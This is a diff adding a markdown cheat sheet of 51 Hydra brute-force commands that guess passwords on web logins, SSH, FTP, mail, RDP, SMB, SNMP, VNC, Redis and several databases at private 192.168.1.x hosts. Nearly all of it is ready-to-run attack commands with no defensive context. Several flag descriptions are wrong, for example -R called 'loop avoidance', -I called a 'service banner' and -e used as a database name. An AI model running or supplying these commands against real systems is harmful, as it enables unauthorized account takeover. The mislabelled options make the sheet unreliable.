@@ -1,0 +1,262 @@
+```markdown
+# Hydra Brute Force Commands
+
+### HTTP-Related Commands
+
+1. **Brute force HTTP Basic Auth on web server**
+```bash
+hydra -l admin -P /home/kali/wordlists/rockyou.txt 192.168.1.103 -s 80 http-get /admin
+```
+
+2. **Brute force HTTP POST form login**
+```bash
+hydra -l user -P /home/kali/wordlists/rockyou.txt 192.168.1.104 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid login"
+```
+
+3. **Brute force HTTP POST form on non-standard port**
+```bash
+hydra -l admin -P /home/kali/wordlists/rockyou.txt 192.168.1.105 -s 8080 http-post-form "/login:username=^USER^&password=^PASS^:Bad credentials"
+```
+
+4. **Brute force HTTP Basic Auth with username list**
+```bash
+hydra -L /home/kali/wordlists/usernames.txt -p pass123 192.168.1.113 -s 80 http-get /secure
+```
+
+5. **Brute force HTTP POST form with JSON body**
+```bash
+hydra -l admin -P /home/kali/wordlists/rockyou.txt 192.168.1.114 -s 9090 http-post-form "/api/login:{\"username\":\"^USER^\",\"password\":\"^PASS^\"}:Invalid credentials"
+```
+
+6. **Brute force HTTPS POST form**
+```bash
+hydra -l user -P /home/kali/wordlists/rockyou.txt 192.168.1.119 https-post-form "/login:username=^USER^&password=^PASS^:Login failed" -t 4
+```
+
+7. **Brute force HTTP GET with custom header**
+```bash
+hydra -l admin -P /home/kali/wordlists/rockyou.txt 192.168.1.118 http-get /admin -H "Authorization: Basic ^USER^:^PASS^"
+```
+
+8. **Brute force HTTP POST form with success condition**
+```bash
+hydra -l admin -P /home/kali/wordlists/rockyou.txt 192.168.1.121 http-post-form "/login.php:username=^USER^&password=^PASS^:S=Welcome" -f
+```
+
+9. **Brute force HTTP Digest Auth**
+```bash
+hydra -l admin -P /home/kali/wordlists/rockyou.txt 192.168.1.122 -s 80 http-digest /admin
+```
+
+10. **Brute force HTTP HEAD request**
+```bash
+hydra -l admin -P /home/kali/wordlists/rockyou.txt 192.168.1.128 http-head /admin -t 4
+```
+
+11. **Brute force HTTP POST form with cookies**
+```bash
+hydra -l user -P /home/kali/wordlists/rockyou.txt 192.168.1.129 http-post-form "/login:username=^USER^&password=^PASS^:Invalid login:C=session=12345" -t 4
+```
+
+12. **Brute force HTTP POST form with CSRF token**
+```bash
+hydra -l admin -P /home/kali/wordlists/rockyou.txt 192.168.1.131 http-post-form "/login:username=^USER^&password=^PASS^&csrf_token=abc123:Invalid login" -t 4
+```
+
+13. **Brute force HTTP Basic Auth with proxy**
+```bash
+proxychains hydra -l admin -P /home/kali/wordlists/rockyou.txt 192.168.1.139 -s 80 http-get /secure -V
+```
+
+14. **Brute force HTTP POST form with failure message**
+```bash
+hydra -L /home/kali/wordlists/usernames.txt -P /home/kali/wordlists/rockyou.txt 192.168.1.141 http-post-form "/login:username=^USER^&password=^PASS^:F=Login failed" -t 4
+```
+
+15. **Brute force HTTP GET with specific user agent**
+```bash
+hydra -l admin -P /home/kali/wordlists/rockyou.txt 192.168.1.134 http-get /admin -U "Mozilla/5.0" -t 4
+```
+
+16. **Brute force HTTP POST form with multiple parameters**
+```bash
+hydra -l admin -P /home/kali/wordlists/rockyou.txt 192.168.1.135 http-post-form "/login:username=^USER^&password=^PASS^&submit=Login:Invalid credentials" -t 4
+```
+
+17. **Brute force HTTP POST form with JSON and custom port**
+```bash
+hydra -l admin -P /home/kali/wordlists/rockyou.txt 192.168.1.137 -s 8443 http-post-form "/api/auth:{\"username\":\"^USER^\",\"password\":\"^PASS^\"}:Invalid credentials" -t 4
+```
+
+18. **Brute force HTTP GET with loop avoidance**
+```bash
+hydra -l admin -P /home/kali/wordlists/rockyou.txt 192.168.1.143 http-get /admin -t 4 -R
+```
+
+19. **Brute force HTTP POST form with success redirect**
+```bash
+hydra -l admin -P /home/kali/wordlists/rockyou.txt 192.168.1.147 http-post-form "/login:username=^USER^&password=^PASS^:S=/dashboard" -t 4
+```
+
+### Non-HTTP Commands
+
+20. **Brute force SSH password with single username (Port 22)**
+```bash
+hydra -l admin -P /home/kali/wordlists/rockyou.txt 192.168.1.100 -t 4 ssh -V
+```
+
+21. **Brute force SSH username with known password (Port 22)**
+```bash
+hydra -L /home/kali/wordlists/usernames.txt -p Password123 192.168.1.100 -t 4 ssh
+```
+
+22. **Brute force SSH with specific timeout (Port 22)**
+```bash
+hydra -l root -P /home/kali/wordlists/rockyou.txt 192.168.1.115 ssh -t 4 -w 30
+```
+
+23. **Brute force SSH with proxy (Port 22)**
+```bash
+proxychains hydra -l admin -P /home/kali/wordlists/rockyou.txt 192.168.1.120 ssh -t 4 -V
+```
+
+24. **Brute force SSH with specific service banner (Port 22)**
+```bash
+hydra -l root -P /home/kali/wordlists/rockyou.txt 192.168.1.138 ssh -t 4 -I
+```
+
+25. **Brute force SSH with single password attempt (Port 22)**
+```bash
+hydra -l admin -p Password123 192.168.1.130 ssh -t 4 -f
+```
+
+26. **Brute force SSH with custom port (Port 2222)**
+```bash
+hydra -l root -P /home/kali/wordlists/rockyou.txt 192.168.1.148 -s 2222 ssh -t 4 -V
+```
+
+27. **Brute force FTP password with verbose output (Port 21)**
+```bash
+hydra -l ftpuser -P /home/kali/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt 192.168.1.102 ftp -V -t 8
+```
+
+28. **Brute force FTP with specific port (Port 2121)**
+```bash
+hydra -l ftpuser -P /home/kali/wordlists/rockyou.txt 192.168.1.117 -s 2121 ftp -V -t 8
+```
+
+29. **Brute force FTP with anonymous login check (Port 21)**
+```bash
+hydra -l anonymous -P /home/kali/wordlists/rockyou.txt 192.168.1.132 ftp -t 4 -V
+```
+
+30. **Brute force Telnet password (Port 23)**
+```bash
+hydra -l admin -P /home/kali/wordlists/rockyou.txt 192.168.1.108 telnet -V -t 4
+```
+
+31. **Brute force Telnet with single username (Port 23)**
+```bash
+hydra -l user -P /home/kali/wordlists/rockyou.txt 192.168.1.144 telnet -t 4 -f
+```
+
+32. **Brute force SMTP password (Port 25)**
+```bash
+hydra -l user -P /home/kali/wordlists/rockyou.txt 192.168.1.111 smtp -t 4 -V
+```
+
+33. **Brute force SMTP with SSL (Port 465)**
+```bash
+hydra -l user -P /home/kali/wordlists/rockyou.txt 192.168.1.133 smtps -t 4 -V
+```
+
+34. **Brute force POP3 password (Port 110)**
+```bash
+hydra -l user -P /home/kali/wordlists/rockyou.txt 192.168.1.109 pop3 -t 8 -V
+```
+
+35. **Brute force POP3 with specific port (Port 110)**
+```bash
+hydra -l user -P /home/kali/wordlists/rockyou.txt 192.168.1.142 -s 110 pop3 -t 4 -V
+```
+
+36. **Brute force IMAP password (Port 143)**
+```bash
+hydra -l user -P /home/kali/wordlists/rockyou.txt 192.168.1.110 imap -t 8 -V
+```
+
+37. **Brute force IMAP with SSL (Port 993)**
+```bash
+hydra -l user -P /home/kali/wordlists/rockyou.txt 192.168.1.136 imaps -t 4 -V
+```
+
+38. **Brute force SMB password (Port 445)**
+```bash
+hydra -l user -P /home/kali/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt 192.168.1.107 smb -t 8
+```
+
+39. **Brute force SNMP community string (Port 161)**
+```bash
+hydra -P /home/kali/wordlists/snmp.txt 192.168.1.123 snmp -t 4 -V
+```
+
+40. **Brute force RDP password (Port 3389)**
+```bash
+hydra -l administrator -P /home/kali/wordlists/rockyou.txt 192.168.1.106 rdp -t 4 -V
+```
+
+41. **Brute force RDP with username list (Port 3389)**
+```bash
+hydra -L /home/kali/wordlists/usernames.txt -P /home/kali/wordlists/rockyou.txt 192.168.1.146 rdp -t 4 -V
+```
+
+42. **Brute force MySQL password on default port (Port 3306)**
+```bash
+hydra -l root -P /home/kali/wordlists/rockyou.txt 192.168.1.101 mysql -t 16
+```
+
+43. **Brute force MySQL with username list (Port 3306)**
+```bash
+hydra -L /home/kali/wordlists/usernames.txt -P /home/kali/wordlists/rockyou.txt 192.168.1.116 mysql -t 16
+```
+
+44. **Brute force MySQL with specific database (Port 3306)**
+```bash
+hydra -l root -P /home/kali/wordlists/rockyou.txt 192.168.1.140 mysql -t 4 -e testdb
+```
+
+45. **Brute force PostgreSQL password (Port 5432)**
+```bash
+hydra -l postgres -P /home/kali/wordlists/rockyou.txt 192.168.1.124 postgres -t 8
+```
+
+46. **Brute force MSSQL password (Port 1433)**
+```bash
+hydra -l sa -P /home/kali/wordlists/rockyou.txt 192.168.1.125 mssql -t 4 -V
+```
+
+47. **Brute force Oracle database password (Port 1521)**
+```bash
+hydra -l system -P /home/kali/wordlists/rockyou.txt 192.168.1.126 oracle -t 4
+```
+
+48. **Brute force Redis password (Port 6379)**
+```bash
+hydra -l user -P /home/kali/wordlists/rockyou.txt 192.168.1.127 redis -t 4 -V
+```
+
+49. **Brute force VNC password (Port 5900)**
+```bash
+hydra -l user -P /home/kali/wordlists/rockyou.txt 192.168.1.112 vnc -t 4 -V
+```
+
+50. **Brute force HTTP POST form with specific timeout (Port 80, included for completeness)**
+```bash
+hydra -l admin -P /home/kali/wordlists/rockyou.txt 192.168.1.145 http-post-form "/login:username=^USER^&password=^PASS^:Invalid login" -t 4 -w 20
+```
+
+51. **Base64 encode creds before send**
+```bash
+hydra -I -f -L wordlists.txt -P wordlists.txt “http-post-form://192.168.1.1:80/admin:username=^USER64^&password=^PASS64^:F=403”
+```
+```
